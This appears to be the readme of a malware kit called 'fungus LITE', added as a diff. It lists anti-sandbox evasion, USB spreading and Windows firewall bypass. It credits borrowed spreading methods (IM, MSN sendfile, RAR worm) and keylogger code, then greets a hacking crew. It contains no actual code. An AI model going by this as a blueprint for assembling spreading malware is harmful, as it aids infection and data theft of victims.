@@ -1,0 +1,47 @@
+   ___                                           
+ /'___\                                          
+/\ \__/  __  __    ___      __   __  __    ____  
+\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
+ \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
+  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE 
+   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
+                            /\____/              
+                            \_/__/     						          
+
+Features:
+
+
+- AntiSandbox (currently supports all public anti-codes; no need to list them all)
+- USB - NOrmal USB
+- Unlimited Server-Support
+- Firewall-bypass (just windows-fw and some simple ones)
+	   
+
+
+
+
+Credits:
+
+- OG for his yim example, it was a rough base for my version
+- crim for his msn sendfile and the rarworm method
+- RageBot developers for their RAR-module, even if I had to tweak and recode much
+- NZM/RX for their keylogger, took some lines from it 
+
+Shouts:
+
+ _____                                _______ __          
+|     \.----.---.-.-----.-----.-----.|     __|  |--.--.--. <3
+|  --  |   _|  _  |  _  |  _  |     ||__     |    <|  |  | <3
+|_____/|__| |___._|___  |_____|__|__||_______|__|__|___  | <3
+                  |_____|                          |_____|
+
+
+- crim for helping me alot, this would be shit without his help
+- stel128 for doing such a great work and managing the best hacking site ;)
+- nexos for giving me buttsekcs when i couldn't code anymoar <3
+- Ic3Drag0n for beeing so gangsta
+- mjd for doing beta-tests of my bin
+- Whole uNk VIP
+
+
+- All other people I forgot that know me :-) 
